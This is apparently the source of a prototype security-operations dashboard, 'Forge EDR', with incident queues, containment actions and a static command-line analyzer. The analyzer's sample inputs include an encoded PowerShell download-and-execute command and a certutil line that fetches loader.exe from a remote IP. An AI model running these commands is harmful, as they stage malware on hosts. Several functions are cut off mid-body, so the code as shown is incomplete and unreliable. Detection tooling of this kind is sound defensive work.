.tjr-row.dim{opacity:.32;}
.tjr-lbl{position:absolute;left:0;top:50%;transform:translateY(-50%);width:122px;font-family:var(--mono);font-size:10px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;padding-right:6px;border-right:1px solid var(--border-soft);cursor:pointer;height:100%;display:flex;align-items:center;}
.tjr-mark{position:absolute;top:50%;transform:translate(-50%,-50%);width:9px;height:9px;border-radius:50%;cursor:pointer;z-index:3;}
.tjr-mark:hover{outline:1.5px solid var(--purple);outline-offset:1px;}
.tjr-mark.sel{outline:2px solid var(--purple);outline-offset:1px;}
.tjr-obs{position:absolute;left:10px;top:-7px;font-size:8px;font-weight:800;color:var(--amber);background:#1c1408;border:1px solid rgba(245,166,35,.5);border-radius:6px;padding:0 4px;white-space:nowrap;}
.tj-edge{fill:none;stroke:#333d4c;stroke-width:1.1;opacity:.8;}
.tj-edge.hi{stroke:var(--purple);stroke-width:1.6;opacity:1;}
@media(max-width:1200px){ .tj3{grid-template-columns:1fr;} .tj-inv-body{max-height:220px;} }
@media(max-width:1100px){ .tj3{grid-template-columns:1fr;} .tj-details{position:static;} .tj3-grid{grid-template-columns:170px 1fr;} .tj-svg2{left:170px;width:calc(100% - 170px);} }

/* command intelligence */
.cmdbox{background:#0d1016;border:1px solid var(--border);border-radius:6px;padding:12px;font-family:var(--mono);font-size:11.5px;color:var(--text-dim);word-break:break-all;}
.decode-arrow{text-align:center;color:var(--faint);font-size:14px;margin:6px 0;}

.tl{position:relative;padding-left:24px;}
.tl::before{content:"";position:absolute;left:5px;top:4px;bottom:4px;width:2px;background:var(--border);}
.tl-item{position:relative;padding-bottom:18px;}
.tl-item::before{content:"";position:absolute;left:-24px;top:2px;width:9px;height:9px;border-radius:50%;background:var(--cyan);border:2px solid var(--bg);}
.tl-item.crit::before{background:var(--red);}
.tl-item.ok::before{background:var(--mint);}
.tl-item .t{font-family:var(--mono);font-size:10.5px;color:var(--faint);}
.tl-item .d{font-size:12px;color:var(--text-dim);margin-top:2px;}
.tl-filters{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px;}
.filter-chip{font-size:10px;padding:4px 9px;border-radius:20px;background:var(--panel2);border:1px solid var(--border);color:var(--muted);}
.filter-chip.on{color:var(--purple);border-color:var(--purple);}

.story p{font-size:13px;line-height:1.85;color:var(--text-dim);}
.ev-ref{color:var(--cyan);border-bottom:1px dotted var(--cyan);cursor:pointer;font-weight:600;}

.sumgrid{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
.sumcard{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:11px 13px;}
.sumcard h4{margin:0 0 7px;font-size:10.3px;text-transform:uppercase;letter-spacing:.4px;color:var(--cyan);}
.sumcard ul{margin:0;padding-left:15px;color:var(--text-dim);font-size:11.5px;line-height:1.75;}
.sumcard.warn h4{color:var(--amber);}
.sumcard.gap h4{color:var(--muted);}
.sumcard.neg{border-color:#2a2436;}
.sumcard.neg h4{color:#b9a3f0;}
.sumcard.neg .why{color:var(--faint);font-size:10.5px;margin-top:6px;}
.verdict-final{grid-column:1/-1;background:#221214;border:1px solid #5c2323;border-radius:6px;padding:13px 15px;}
.verdict-final h4{color:var(--red);margin:0 0 4px;font-size:11.5px;}

.graph-wrap{display:flex;gap:14px;}
.graph-svg-box{flex:1;background:var(--panel2);border:1px solid var(--border);border-radius:6px;}
.graph-side{width:250px;background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:11px;font-size:11.5px;color:var(--muted);}
.gnode{cursor:pointer;} .gnode circle{transition:.15s;} .gnode:hover circle{filter:brightness(1.35);}
.gnode text{fill:var(--text-dim);font-size:9px;font-family:var(--sans);}
.gedge{stroke:#242b38;stroke-width:1.3;}

.overlay{position:fixed;inset:0;background:rgba(4,6,9,.62);z-index:200;display:none;align-items:center;justify-content:center;}
.overlay.open{display:flex;}
.modal{background:#10141c;border:1px solid var(--border);border-radius:9px;width:420px;max-width:92vw;padding:18px;box-shadow:0 22px 55px rgba(0,0,0,.6);}
.modal h3{margin:0 0 8px;font-size:13.5px;}
.modal .reason{font-size:11.5px;color:var(--text-dim);background:var(--panel2);border-left:3px solid var(--amber);padding:8px 10px;border-radius:4px;margin:9px 0;}
.modal .impact{font-size:11px;color:var(--muted);margin-bottom:14px;}
.modal-actions{display:flex;justify-content:flex-end;gap:9px;}
.btn.cancel{background:transparent;}
.btn.confirm{background:var(--red);color:#fff;border:none;}
.modal textarea, .modal input[type=text]{width:100%;background:var(--panel2);border:1px solid var(--border);border-radius:5px;color:var(--text);padding:8px 10px;font-family:var(--sans);font-size:12px;margin-bottom:6px;}

.drawer-overlay{position:fixed;inset:0;background:rgba(4,6,9,.5);z-index:190;display:none;}
.drawer-overlay.open{display:block;}
.drawer{position:fixed;right:0;top:0;bottom:0;width:380px;max-width:92vw;background:#10141c;border-left:1px solid var(--border);z-index:191;padding:18px;overflow-y:auto;transform:translateX(100%);transition:transform .2s ease;}
.drawer.open{transform:translateX(0);}
.drawer h3{margin:0 0 4px;font-size:13.5px;}
.drawer .sub{color:var(--muted);font-size:11px;margin-bottom:13px;}
.drawer-close{position:absolute;right:14px;top:14px;color:var(--muted);font-size:17px;}

.toast{position:fixed;bottom:20px;right:20px;background:#10141c;border:1px solid #362559;border-left:4px solid var(--purple);border-radius:7px;padding:11px 15px;font-size:12px;z-index:300;box-shadow:0 10px 30px rgba(0,0,0,.5);display:none;max-width:340px;}
.toast.show{display:block;}
.toast .tt{font-weight:800;color:var(--purple);margin-bottom:2px;}

.policy-card{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:13px 15px;margin-bottom:10px;}
.policy-card .name{font-weight:800;font-size:12.5px;margin-bottom:4px;}
.policy-cond{font-family:var(--mono);font-size:11px;color:var(--text-dim);background:#0d1016;border:1px solid var(--border-soft);border-radius:4px;padding:8px 10px;margin:8px 0;}
.policy-row{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid var(--border-soft);font-size:11px;}
.policy-row .k{color:var(--faint);}
.toggle-group{display:flex;gap:6px;}
.toggle-opt{padding:5px 10px;border-radius:4px;font-size:10.5px;border:1px solid var(--border);color:var(--muted);}
.toggle-opt.on{background:var(--purple-dim);color:var(--purple);border-color:var(--purple);}

.notes-list{margin-top:8px;}
.queue-toolbar{display:flex;gap:12px;align-items:center;flex-wrap:wrap;padding:10px 13px;border-bottom:1px solid var(--border);}
.qf-group{display:flex;gap:4px;flex-wrap:wrap;}

/* Investigation Actions + Notes stream */
.notes-stream{display:flex;flex-direction:column;gap:8px;}
.note-row{background:var(--panel2);border:1px solid var(--border-soft);border-radius:6px;padding:9px 11px;}
.note-meta{font-size:9.5px;color:var(--faint);margin-bottom:4px;}
.note-meta b{color:var(--text-dim);font-weight:700;}
.note-text{font-size:11.5px;color:var(--text-dim);line-height:1.5;}
.activity-stream{display:flex;flex-direction:column;gap:1px;background:var(--border-soft);border:1px solid var(--border);border-radius:6px;overflow:hidden;}
.act-row{display:flex;gap:10px;align-items:baseline;background:var(--panel2);padding:7px 11px;font-size:11.3px;}
.act-t{color:var(--faint);flex-shrink:0;width:64px;}
.act-actor{color:var(--purple);font-weight:700;flex-shrink:0;width:52px;}
.act-text{color:var(--text-dim);}
.act-delta{color:var(--faint);}
.attach-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:10px;}
.attach-card{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:10px 12px;}
.attach-top{display:flex;gap:8px;align-items:flex-start;}
.attach-ic{font-size:18px;}
.attach-name{font-size:11.5px;color:var(--text-dim);font-weight:700;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
.attach-meta{font-size:9.5px;color:var(--faint);margin-top:2px;}
.attach-hash{font-size:9.5px;color:var(--faint);margin-top:6px;word-break:break-all;}
.attach-desc{font-size:11px;color:var(--text-dim);margin-top:6px;}
.attach-thumb{max-width:100%;border-radius:5px;margin-top:8px;cursor:zoom-in;border:1px solid var(--border);}
.attach-preview-toggle{font-size:10.5px;color:var(--cyan);cursor:pointer;margin-top:8px;}
.attach-textbox{max-height:220px;overflow-y:auto;background:#0a0d12;border:1px solid var(--border);border-radius:5px;padding:6px 8px;margin-top:6px;font-size:10px;}
.tpl-line{white-space:pre-wrap;word-break:break-all;color:var(--text-dim);}
.tpl-no{color:var(--faint);display:inline-block;width:34px;user-select:none;}
.note-item{background:var(--panel2);border:1px solid var(--border-soft);border-radius:5px;padding:8px 10px;margin-bottom:6px;font-size:11.5px;}
.note-item .meta{color:var(--faint);font-size:9.5px;margin-bottom:3px;}

.state-banner{display:flex;gap:18px;flex-wrap:wrap;background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:10px 14px;margin-bottom:12px;}
.state-chip{font-size:11px;display:flex;gap:6px;align-items:center;}
.state-chip .k{color:var(--faint);}
.state-chip .v{font-weight:800;font-family:var(--mono);}
.state-chip .v.bad{color:var(--red);} .state-chip .v.good{color:var(--mint);} .state-chip .v.warn{color:var(--amber);}

.search-results{position:absolute;top:calc(100% + 4px);left:0;right:0;background:#10141c;border:1px solid var(--border);border-radius:7px;max-height:340px;overflow-y:auto;z-index:150;box-shadow:0 14px 34px rgba(0,0,0,.55);display:none;}
.search-results.open{display:block;}
.sr-item{padding:8px 12px;border-bottom:1px solid var(--border-soft);font-size:11.5px;display:flex;justify-content:space-between;gap:10px;}
.sr-item:hover{background:#171e2b;}
.sr-item .type{color:var(--faint);font-size:9.5px;text-transform:uppercase;}

.audit-card{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:11px 13px;margin-bottom:8px;font-size:11.3px;}
.audit-card .id{font-family:var(--mono);color:var(--purple);font-weight:800;margin-bottom:6px;}

/* ===== Responsive ===== */
@media (max-width: 1000px){
  #body{flex-direction:column;}
  #sidebarNav{width:100%;flex:0 0 auto;max-height:180px;display:flex;flex-wrap:wrap;padding:8px;}
  #sidebarNav .nav-title{width:100%;}
  #sidebarNav .nav-item{border-left:none;border-radius:4px;}
  .tabbar{overflow-x:auto;-webkit-overflow-scrolling:touch;}
  .split{grid-template-columns:1fr;}
  .stat-grid{grid-template-columns:repeat(2,1fr);}
  .sumgrid{grid-template-columns:1fr;}
  .traj-lanes{min-width:700px;}
  .traj{overflow-x:auto;}
  .page{padding:14px;}
  .search-wrap{max-width:none;}
  .topnav{overflow-x:auto;}
}
@media (max-width: 620px){
  .stat-grid{grid-template-columns:repeat(2,1fr);}
  .inc-top{flex-direction:column;}
  .hdr-actions{flex-wrap:wrap;}
  table{font-size:10.8px;}
}

/* entity-aware quick pivots — the menu offered depends on entity type */
const PIVOT_MENUS = {
  device:[["Open Forge EDR","__winopen:edr"],["Investigate (this incident)","edr"],["Endpoint Forensics","forensics"],["Timeline","timeline"],["Evidence Graph","graph"],["Related Incidents","overview"],["Search Data Lake","datalake"]],
  user:[["Identity Investigation","itdr"],["Authentication Timeline","timeline"],["Sessions","itdr"],["Related Devices","edr"],["Evidence Graph","graph"],["Search Data Lake","datalake"]],
  ip:[["IOC Intelligence","ioc"],["Network Timeline","ndr"],["C2 Evidence","ndr"],["Related Incidents","overview"],["Evidence Graph","graph"],["Search Data Lake","datalake"],["Block IP","__block_ip"]],
  hash:[["IOC Intelligence","ioc"],["File Evidence","edr"],["Related Devices","edr"],["Related Incidents","overview"],["Threat Intelligence","ioc"],["Block Hash","__block_hash"]],
  domain:[["IOC Intelligence","ioc"],["DNS Timeline","ndr"],["Network Evidence","ndr"],["Related Incidents","overview"],["Search Data Lake","datalake"],["Block Domain","__block_domain"]],
};
function entityType(entity){
  if(entity==="WIN-10-21H2"||entity==="SRV-102"||entity==="API-042"||entity==="LAP-881") return 'device';
  if(/^\d{1,3}(\.\d{1,3}){3}/.test(entity)) return 'ip';
  if(entity.includes('.') && !entity.includes(' ') && !/…|\.\.\./.test(entity) && entity.split('.').length>=2 && !/^\d/.test(entity)) return 'domain';
  if(entity.includes('…') || /^[a-f0-9]{6,}/i.test(entity)) return 'hash';
  return 'user';
}
function pivot(entity,label){
  const type = entityType(entity);
  const menu = PIVOT_MENUS[type] || PIVOT_MENUS.user;
  return `<span class="pivot-wrap"><span class="pivot-anchor" data-pivot="${entity}">${label||entity}</span>
    <div class="pivot-menu" data-pivotmenu="${entity}">
      ${menu.map(([lbl,tab])=>`<div class="pi" data-tab="${tab}" data-entity="${entity}">${lbl}</div>`).join('')}
    </div></span>`;
}
function attachPivotEvents(){
  document.querySelectorAll('.pivot-anchor').forEach(a=>{
    a.addEventListener('click', (e)=>{
      e.stopPropagation();
      document.querySelectorAll('.pivot-menu').forEach(m=>{ if(m.getAttribute('data-pivotmenu')!==a.getAttribute('data-pivot')) m.classList.remove('open'); });
      a.nextElementSibling.classList.toggle('open');
    });
  });
  document.querySelectorAll('.pi[data-entity]').forEach(pi=>{
    pi.addEventListener('click', (e)=>{
      e.stopPropagation();
      const tab = pi.getAttribute('data-tab'); const entity = pi.getAttribute('data-entity');
      pi.closest('.pivot-menu').classList.remove('open');
      if(tab.startsWith('__page:')){
        state.page = tab.slice(7); render(); return;
      }
      if(tab.startsWith('__winopen:')){
        openTelemetryWindow(tab.slice(10)); return;
      }
      if(tab.startsWith('__')){
        const actionMap = {__block_ip:['Block IP','104.18.34.12'], __block_hash:['Block Hash','c0ffee…91ab'], __block_domain:['Block Domain','api.example.net']};
        const [name,target] = actionMap[tab];
        state.pendingAction = {name, target, reason:`Quick pivot containment for ${entity}.`, impact:'This indicator will be blocked at the relevant control point.'};
        openConfirm(); return;
      }
      showToast('Pivot', `Pivoted on ${entity} → ${pi.textContent}`);
      state.page='incident'; state.tab = tab||'overview'; render();
    });
  });
  document.addEventListener('click', ()=>document.querySelectorAll('.pivot-menu').forEach(m=>m.classList.remove('open')));
}

function computeKpis(){
  const open = INCIDENTS.filter(i=>['New','In Progress','On Hold'].includes(i.status));
  const critical = open.filter(i=>i.sev==='critical').length;
  const high = open.filter(i=>i.sev==='high').length;
  const unassigned = INCIDENTS.filter(i=>i.owner==='Unassigned' && !['Resolved','Closed'].includes(i.status)).length;
  const myQueue = INCIDENTS.filter(i=>i.owner===ME && !['Resolved','Closed'].includes(i.status)).length;
  const activeResponse = INVESTIGATION_SSOT.responseActions.filter(r=>r.result==='PENDING').length;
  const evidenceOpen = open.reduce((s,i)=>s+i.evcount,0);
  return {open:open.length, critical, high, unassigned, myQueue, activeResponse, evidenceOpen};
}
function renderOverview(myQueueOnly){
  const q = (state.queueSearch||'').trim().toLowerCase();
  const statusFilter = state.queueStatus || 'All';
  const sevFilter = state.queueSeverity || 'All';
  const ownerFilter = state.queueOwner || 'All';
  let rows = myQueueOnly ? INCIDENTS.filter(i=>i.owner===ME) : INCIDENTS;
  if(statusFilter==='OpenAgg') rows = rows.filter(i=>['New','In Progress','On Hold'].includes(i.status));
  else if(statusFilter!=='All') rows = rows.filter(i=>i.status===statusFilter);
  if(sevFilter!=='All') rows = rows.filter(i=>i.sev===sevFilter);
  if(ownerFilter==='Unassigned') rows = rows.filter(i=>i.owner==='Unassigned');
  if(q) rows = rows.filter(i=>[i.id,i.title,i.device,i.user,i.owner,i.customer].join(' ').toLowerCase().includes(q));
  // default operational ordering: critical/high first among open, then by status, then most-recently-updated
  const sevRank = {critical:0,high:1,medium:2,low:3};
  const statusRank = {'New':0,'In Progress':1,'On Hold':2,'Resolved':3,'Closed':4};
  rows = rows.slice().sort((a,b)=> (statusRank[a.status]-statusRank[b.status]) || (sevRank[a.sev]-sevRank[b.sev]) || b.last.localeCompare(a.last));
  const k = computeKpis();
  return `
  <div class="page-header"><div><h1>${myQueueOnly?'My Queue':'Security Operations'}</h1><div class="page-sub">${myQueueOnly?`Incidents assigned to ${ME}`:'What requires attention now'}</div></div></div>

    <div class="stat-card high kpi-clickable" data-kpi="unassigned"><div class="lbl">Unassigned</div><div class="val">${k.unassigned}</div></div>

    <div class="stat-card info kpi-clickable" data-kpi="activeResponse"><div class="lbl">Active Response</div><div class="val">${k.activeResponse}</div></div>
    <div class="stat-card na"><div class="lbl">SLA At Risk</div><div class="val">N/A</div><div class="trend">No SLA model configured</div></div>
    <div class="stat-card ok"><div class="lbl">Evidence (Open)</div><div class="val">${k.evidenceOpen}</div></div>
  </div>`}

    <div class="panel-head"><h3>Incident Queue</h3><span style="font-size:11px;color:var(--muted);">${rows.length} of ${myQueueOnly?INCIDENTS.filter(i=>i.owner===ME).length:INCIDENTS.length}</span></div>
    <div class="queue-toolbar">
      <div class="search-wrap" style="max-width:280px;">🔎 <input id="queueSearch" placeholder="Search ID, title, device, user, owner…" value="${state.queueSearch||''}"></div>
      <div class="qf-group">
        ${['All',...INCIDENT_STATES].map(s=>`<button class="btn small ${statusFilter===s?'primary':''}" data-qf="${s}">${s}</button>`).join('')}

        <tbody>
          ${rows.length ? rows.map(i=>`
            <tr class="rowlink" data-inc="${i.id}">
              <td class="mono">${i.id}</td><td>${i.title}</td><td class="mono">${i.priority}</td><td>${sevBadge(i.sev)}</td>

   FORGE EDR — home landing (Security > Forge EDR). Owns the
   endpoint inventory and every endpoint-scoped capability,

/* ============================================================
   COMMAND INTELLIGENCE — standalone (Intelligence). Not owned by
   EDR or Investigation; invocable from either, but analysts can
   also paste a raw command line directly here for static,
   evidence-independent analysis. Static analysis only — never
   executes the input.
   ============================================================ */
const CMDINTEL_SAMPLES = {
  ps_enc: "powershell.exe -NoP -W Hidden -EncodedCommand JABzAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGEAcABpAC4AZQB4AGEAbQBwAGwAZQAuAG4AZQB0AC8AZwBhAHQAZQAuAHAAaABwACcAKQA7AEkARQBYACAAJABzAA==",
  cmd_plain: "cmd.exe /c whoami /all",
  certutil: "certutil.exe -urlcache -split -f http://185.212.44.19/loader.exe C:\\Windows\\Temp\\loader.exe",
};
function analyzeCommand(raw){
  const r = raw.trim();
  if(!r) return null;
  const isPs = /powershell/i.test(r);
  const encMatch = r.match(/-e(nc(odedcommand)?)?\s+([A-Za-z0-9+/=]{20,})/i);
  if(isPs && encMatch){
    let decoded = null, ok=false;
    try{
      const b64 = encMatch[3];
      const bin = atob(b64);
      let out = '';
      for(let i=0;i<bin.length;i+=2) out += bin[i];
      decoded = out; ok = /[\x20-\x7e]/.test(out) && out.length>3;
    }catch(e){ ok=false; }
    return {
      raw:r, interp:"PowerShell", encoding: ok? "Base64 / UTF-16LE" : "Base64 (decode uncertain)",
      obfuscation: "-EncodedCommand wrapper", state: ok? "Decoded" : "Partially Decoded",
      decoded: ok? decoded : null,
      semantic: ok? "Downloads a remote payload string over HTTP and executes it in-memory via IEX — download-and-execute staging that avoids an initial disk write." : "Base64 layer detected but did not decode to a printable UTF-16LE command — flagged for manual review rather than guessed.",
      iocs: ok && /https?:\/\/([^'")\s]+)/i.test(decoded||'') ? [decoded.match(/https?:\/\/([^'")\s]+)/i)[0]] : [],
      mitre: ["T1059.001 PowerShell","T1027 Obfuscated Files or Information","T1105 Ingress Tool Transfer"],
      risk:"HIGH", verdict:"Contributes +30 to Verdict if correlated with execution evidence",
    };
  }
  if(/certutil/i.test(r) && /urlcache/i.test(r)){
    const urlm = r.match(/https?:\/\/[^\s]+/i);
    return {raw:r, interp:"certutil.exe (LOLBAS)", encoding:"Not Encoded", obfuscation:"None", state:"Not Encoded", decoded:null,
      semantic:"certutil abused as a download-and-write utility (LOLBAS) — fetches a remote binary and writes it to a local temp path.",
      iocs: urlm?[urlm[0]]:[], mitre:["T1105 Ingress Tool Transfer","T1218.010 Signed Binary Proxy Execution: Certutil"], risk:"HIGH",
      verdict:"Contributes +25 to Verdict if the written file is later executed."};
  }
  return {raw:r, interp: isPs?"PowerShell":"Shell / Unknown Interpreter", encoding:"Not Encoded", obfuscation:"None detected",
    state:"Not Encoded", decoded:null, semantic:"No encoding, obfuscation, or known download-and-execute pattern detected in this command line.",
    iocs:[], mitre:[], risk:"LOW", verdict:"No contribution to Verdict from this command alone."};
}

  const btns = [];

function attachIncidentEvents(){
  document.querySelectorAll('[data-toptab]').forEach(b=>b.addEventListener('click', ()=>{
    const t = b.getAttribute('data-toptab');
    state.tab = t==='overview' ? 'overview' : t==='investigation' ? INVESTIGATION_SUBTABS[0][0] : t==='activity' ? 'activity' : 'response';
    render();
  }));
  document.querySelectorAll('[data-tab]').forEach(b=>b.addEventListener('click', ()=>{ state.tab=b.getAttribute('data-tab'); render(); }));
  document.querySelectorAll('[data-back-overview]').forEach(b=>b.addEventListener('click', ()=>{ state.tab='overview'; render(); }));
  document.querySelectorAll('[data-domain-scope]').forEach(b=>b.addEventListener('click', ()=>{ state.domainScope = b.getAttribute('data-domain-scope'); render(); }));
  document.querySelectorAll('[data-stub]').forEach(b=>b.addEventListener('click', ()=>showToast(b.getAttribute('data-stub'), 'Not available in this prototype — no backend capability wired for this yet.')));
  const actionsBtn = document.getElementById('actionsBtn');
  if(actionsBtn) actionsBtn.addEventListener('click',(e)=>{ e.stopPropagation(); state.actionsMenuOpen=!state.actionsMenuOpen; render(); });
  document.querySelectorAll('.a-item').forEach(a=>{
    a.addEventListener('click', ()=>{
      state.pendingAction = {name:a.getAttribute('data-action'), target:a.getAttribute('data-target'), reason:a.getAttribute('data-reason'), impact:a.getAttribute('data-impact')};
      state.actionsMenuOpen = false; openConfirm();
    });
  });
  document.getElementById('noteBtn')?.addEventListener('click', ()=>document.getElementById('noteOverlay').classList.add('open'));
  document.getElementById('assignBtn')?.addEventListener('click', ()=>document.getElementById('assignOverlay').classList.add('open'));
  document.getElementById('reportBtn')?.addEventListener('click', ()=>{ state.tab='report'; render(); });
  document.querySelectorAll('[data-lc]').forEach(el=>el.addEventListener('click',()=>{
    const act = el.getAttribute('data-lc'); const inc = currentInc(); const t = nowClock();
    if(act==='assign-me'){ logActivity('Assigned incident', inc.owner, ME); inc.owner=ME; showToast('Assigned to You', `${inc.id} is now assigned to you.`); }
    else if(act==='start'){ logActivity('State changed', inc.status, 'In Progress'); inc.status='In Progress'; showToast('Investigation Started', `${inc.id} moved to In Progress.`); }
    else if(act==='hold'){ document.getElementById('holdOverlay').classList.add('open'); return; }
    else if(act==='resume'){ logActivity('State changed', 'On Hold', 'In Progress'); inc.status='In Progress'; inc.hold=null; showToast('Resumed', `${inc.id} resumed — back to In Progress.`); }
    else if(act==='resolve'){ logActivity('State changed', inc.status, 'Resolved'); inc.status='Resolved'; showToast('Resolved', `${inc.id} marked Resolved.`); }
    else if(act==='close'){ logActivity('State changed', 'Resolved', 'Closed'); inc.status='Closed'; showToast('Closed', `${inc.id} closed.`); }
    else if(act==='reopen'){ const prev=inc.status; logActivity('State changed', prev, 'In Progress'); inc.status='In Progress'; showToast('Reopened', `${inc.id} reopened — back to In Progress.`); }
    render();

function domainSummaryFor(inc){
  if(inc.id==="INC-2026-05-17-0001") return DOMAIN_SUMMARY_RICH;
  // lighter, generic summaries for the other incidents: 'related' if the
  // domain appears in inc.domains, 'searched' with a generic negative
  // otherwise, 'notconnected' for domains this tenant hasn't wired up.
  const keys = ['edr','ndr','itdr','cloud','email','appapi','ctem','ioc'];

    if(present.has(k)) out[k] = {label, state:'related', count: 8 + Math.floor(inc.evcount/8), bullets:[`Evidence correlated to ${inc.device}`,`Involves ${inc.user}`], why:`Directly relevant to ${inc.title.toLowerCase()}.`, tab:k};

  });

    const target = el.getAttribute('data-domain-open');
    const meta = DOMAIN_META[target];
    logActivity(`Investigation source opened: ${meta?meta.group:target}`, '—', '—');
    if(DOMAIN_PAGE_MAP[target]){ openTelemetryWindow(target); return; }
    state.tab = target; render();
  }));
  const attachInput = document.getElementById('attachInput');
  if(attachInput){ attachInput.addEventListener('change', async (e)=>{
    const file = e.target.files && e.target.files[0];
    if(!file) return;
    const isImage = /\.(png|jpe?g)$/i.test(file.name);
    const isText = /\.(txt|csv|json|xml|log)$/i.test(file.name);
    const id = 'ATT-'+Math.random().toString(36).slice(2,8).toUpperCase();
    const rec = {id, filename:file.name, size:file.size, mime:file.type||'—', uploadedBy:ME, uploadedAt:nowClock(),
      type: isImage?'image':(isText?'text':'other'), role:'Documentation', description:'', hash:null, dataUrl:null, textContent:null};
    state.attachments.push(rec);
    logActivity(`Attachment uploaded: ${file.name}`, humanSize(file.size), rec.mime||'—');
    render();
    try{
      const buf = await file.arrayBuffer();
      const digest = await crypto.subtle.digest('SHA-256', buf);
      rec.hash = Array.from(new Uint8Array(digest)).map(b=>b.toString(16).padStart(2,'0')).join('');
    }catch(err){ rec.hash = 'unavailable'; }
    if(isImage){ rec.dataUrl = await new Promise(res=>{ const r=new FileReader(); r.onload=()=>res(r.result); r.readAsDataURL(file); }); }
    if(isText){ rec.textContent = await new Promise(res=>{ const r=new FileReader(); r.onload=()=>res(r.result); r.readAsText(file); }); }
    render();

  document.querySelectorAll('[data-tj-filter]').forEach(el=>el.addEventListener('click',()=>{traj.filter=el.getAttribute('data-tj-filter');render();}));
  document.querySelectorAll('[data-traj-add]').forEach(el=>el.addEventListener('click',()=>showToast('Candidate Evidence','Proposed to the Investigation SSOT for correlation review — it does not silently become evidence.')));
  const tjs=document.getElementById('trajSearch');
  if(tjs){ tjs.addEventListener('input',()=>{ traj.qRaw=tjs.value; traj.q=tjs.value.trim().toLowerCase(); const v=tjs.value; render(); const el2=document.getElementById('trajSearch'); if(el2){el2.focus(); el2.setSelectionRange(v.length,v.length);} }); }
  document.querySelectorAll('[data-ad-tab]').forEach(el=>el.addEventListener('click',()=>{traj.adTab=el.getAttribute('data-ad-tab');render();}));
  document.querySelectorAll('[data-ad-close]').forEach(el=>el.addEventListener('click',()=>{traj.selected=null;render();}));
  document.querySelectorAll('[data-traj-open-ev]').forEach(el=>el.addEventListener('click',()=>openEvidence(el.getAttribute('data-traj-open-ev'))));
  document.querySelectorAll('[data-traj-add]').forEach(el=>el.addEventListener('click',()=>showToast('Candidate Evidence','Proposed to the Investigation SSOT for correlation review — it does not silently become evidence.')));
  document.querySelectorAll('[data-ad-act]').forEach(el=>el.addEventListener('click',()=>{
    state.pendingAction={name:el.getAttribute('data-ad-act'),target:el.getAttribute('data-ad-target'),reason:'Initiated from Device Trajectory activity details.',impact:el.getAttribute('data-ad-act')==='Isolate Endpoint'?'Network connectivity restricted to management traffic.':'Process terminated immediately.'};
    openConfirm();
  }));
  document.querySelectorAll('[data-dev-takeaction]').forEach(el=>el.addEventListener('click',(e)=>{e.stopPropagation();state.actionsMenuOpen=!state.actionsMenuOpen;render();}));
  const ts=document.getElementById('trajSearch');
  if(ts){ ts.addEventListener('input',()=>{ traj.qRaw=ts.value; traj.q=ts.value.trim().toLowerCase(); const v=ts.value; render(); const el2=document.getElementById('trajSearch'); if(el2){el2.focus(); el2.setSelectionRange(v.length,v.length);} }); }
}

/* ============================================================
   EVIDENCE DRAWER
   ============================================================ */
function openEvidence(id){
  const e = EVIDENCE[id]; if(!e) return;
  document.getElementById('drawerContent').innerHTML = `
    <h3>${e.title}</h3>
    <div class="sub">${e.domain} · ${e.entity} · ${e.ts}</div>
    <div class="kv" style="margin-bottom:12px;"><div class="k">Canonical Evidence</div><div class="v" style="font-family:var(--sans);line-height:1.6;">${e.detail}</div></div>
    <div class="section-title">MITRE ATT&CK</div>
    <div>${e.attck && e.attck!=='—' ? `<span class="mitre-chip">${e.attck}</span>` : '<span style="color:var(--muted);font-size:11px;">Not mapped</span>'}</div>
    <div class="section-title">Provenance</div>
    <div class="kv"><div class="k">Source</div><div class="v">${e.domain} Sensor</div></div>
    <div class="kv" style="margin-top:8px;"><div class="k">Incident</div><div class="v">${state.currentIncident}</div></div>
    <div class="toolbar" style="margin-top:14px;">
      <button class="btn small">Open Source</button><button class="btn small">Open Related Evidence</button><button class="btn small">Add Note</button><button class="btn small">Pivot</button>
    </div>`;
  document.getElementById('drawer').classList.add('open');
  document.getElementById('drawerOverlay').classList.add('open');
}
document.getElementById('drawerClose').addEventListener('click', closeDrawer);
document.getElementById('drawerOverlay').addEventListener('click', closeDrawer);
function closeDrawer(){ document.getElementById('drawer').classList.remove('open'); document.getElementById('drawerOverlay').classList.remove('open'); }

/* ============================================================
   ACTIONS: CONFIRM + EXECUTE + VERIFY
   ============================================================ */
function openConfirm(){
  document.getElementById('confirmTitle').textContent = `${state.pendingAction.name.toUpperCase()}`;
  document.getElementById('confirmTarget').textContent = `Target: ${state.pendingAction.target}`;
  document.getElementById('confirmReason').textContent = `Reason: ${state.pendingAction.reason}`;
  document.getElementById('confirmImpact').textContent = `Impact: ${state.pendingAction.impact}`;
  document.getElementById('confirmOverlay').classList.add('open');
}
document.getElementById('confirmCancel').addEventListener('click', ()=>{ document.getElementById('confirmOverlay').classList.remove('open'); state.pendingAction=null; });
document.getElementById('confirmOk').addEventListener('click', ()=>{
  document.getElementById('confirmOverlay').classList.remove('open');
  requestResponseAction(state.pendingAction); state.pendingAction = null;
});
let raCounter = 184;
function applyStateChange(actionName){
  const s = INVESTIGATION_SSOT.liveState;
  const map = {
    "Isolate Endpoint": ()=>{ s.c2='CONTAINED'; s.endpoint='ISOLATED'; },
    "Release Isolation": ()=>{ s.endpoint='COMPROMISED'; },
    "Block Network": ()=>{ s.c2='CONTAINED'; },
    "Kill Process": ()=>{ s.process_5116='TERMINATED'; },
    "Suspend Process": ()=>{ s.process_5116='SUSPENDED'; },
    "Quarantine File": ()=>{ s.file_loader='QUARANTINED'; },
    "Delete File": ()=>{ s.file_loader='DELETED'; },
    "Block IP": ()=>{ s.c2='CONTAINED'; },
    "Block Hash": ()=>{ s.file_loader='BLOCKED FLEET-WIDE'; },
    "Block Domain": ()=>{ s.c2='CONTAINED'; },
